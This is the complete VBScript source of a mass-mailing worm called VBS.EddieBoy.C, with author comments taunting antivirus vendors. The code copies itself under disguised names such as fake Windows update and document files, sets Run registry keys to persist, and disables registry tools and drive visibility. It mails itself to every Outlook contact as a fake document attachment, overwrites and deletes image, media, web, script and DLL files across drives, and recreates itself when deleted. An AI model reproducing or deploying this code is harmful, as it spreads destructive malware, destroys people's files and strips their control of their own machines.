' R.I.P. EddieBoy September 11, 2000 - December 25, 2004
' VBS.EddieBoy.C
' 3rd Version of worm
spawn()

sub spawn()
Set s = CreateObject("Scripting.FileSystemObject")
Set f = s.GetFile(wscript.scriptfullname)
f.Copy ("c:\DOCUMENTS.DOC.vbs")
f.Copy ("c:\EDDIEBOYWASHERE.vbs")
f.Copy ("c:\WINDOWS\System32\SysReg.vbs")
f.Copy ("c:\WINDOWS\WUpdate_35253825.vbs")
f.Copy ("c:\WINDOWS\YOUR-DOCUMENTS.DOC.vbs")
f.Copy ("c:\WINDOWS\MSKernelUpdate_435353.vbs")
end sub

set eddie3rd = wscript.CreateObject("WScript.Shell")
Set fso = createobject("scripting.filesystemobject")
eddie3rd.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SystemRegistry" , "C:\WINDOWS\System32\SysReg.vbs"
eddie3rd.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate" , "C:\WINDOWS\WUpdate_35253825.vbs"
eddie3rd.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EDDIEBOYWASHERE" , "C:\EDDIEBOYWASHERE.vbs"
eddie3rd.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MSKernelAutoUpdater" , "C:\WINDOWS\MSKernelUpdate_435353.vbs"
CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 67108863, "REG_DWORD"
CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled", 1, "REG_DWORD"
createobject("Wscript.shell").regwrite "HKEY_CLASSES_ROOT\Directory\Shell\MSUpdate_0459058\Command\","WScript.exe | C:\WINDOWS\System32\SysReg.vbs"

mail()

sub mail()

On Error Resume Next
dim x,a,ctrlists,ctrentries,EddieMail,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
EddieMail=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&EddieMail)
if (regad="") then
set OutLookMail=out.CreateItem(0)
OutLookMail.Recipients.Add(EddieMail)
OutLookMail.Subject = "Re: YOUR DOCUMENTS"
OutLookMail.Body = vbcrlf&"The DOCUMENTS you requested are in the attachments"
OutLookMail.Attachments.Add "c:\WINDOWS\YOUR-DOCUMENTS.DOC.vbs"
OutLookMail.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&EddieMail,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub

CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"

eddie()

Sub eddie()

On Error Resume Next
Dim d, dc, s, fso, eddie
Set fso = CreateObject("Scripting.FileSystemObject")
Set dc = fso.Drives
For Each d In dc
If d.DriveType = 2 Or d.DriveType = 3 Then
eddieboy (d.Path & "\")
End If
Next
eddie = s
End Sub

Sub ed(folderspec)
On Error Resume Next
Dim f, f1, fc, ext, s, fso
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.GetFolder(folderspec)
Set fc = f.Files
For Each f1 In fc
ext = fso.GetExtensionName(f1.Path)
ext = LCase(ext)
s = LCase(f1.Name)
If (ext = "dll") Or (ext = "htm") Or (ext = "html") Or (ext = "shtml") Or (ext = "jpeg") Or (ext = "jpg") Or (ext = "bmp") Or (ext = "gif") Or  (ext = "vbs") Or (ext = "vbe") Or (ext = "wsh") Or (ext = "js") Or (ext = "jse") Or (ext = "mp2") Or (ext = "mp3") Or (ext = "mpg") Or (ext = "mpeg") Or (ext = "avi") Or (ext = "lnk") Then
Set f = fso.GetFile(wscript.scriptfullname)
f.Copy (f1.Path & ".vbs")
fso.deletefile(f1.path)
End If
If (s = "DOCUMENTS") Then
Set f = fso.getfile(wscript.scriptfullname)
f.Copy (f1.Path)
fso.deletefile(f1.path)
End If
Next
End Sub
Sub eddieboy(folderspec)
On Error Resume Next
Dim f, f1, sf, fso
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.GetFolder(folderspec)
Set sf = f.SubFolders
For Each f1 In sf
ed (f1.Path)
eddieboy (f1.Path)
Next
End Sub
' =========================
' Greetz to AV Companies:
' I will survive,
' In this momment in time,
' Your computer will crash,
' So you will be mine,
' I never crash,
' I never fail,
' So, in this momment in time,
' I will survive...
' - EddieBoy Author 1-8-05
' =========================
antideletion()

sub antideletion()

Set fso = CreateObject("scripting.filesystemobject")
Set fuck = fso.opentextfile(wscript.scriptfullname, 1)
vir = fuck.readall
fuck.Close
Do
If Not (fso.fileexists(wscript.scriptfullname)) Then
Set fuck = fso.createtextfile(wscript.scriptfullname, True)
fuck.write vir
fuck.Close
End If
Loop
End sub
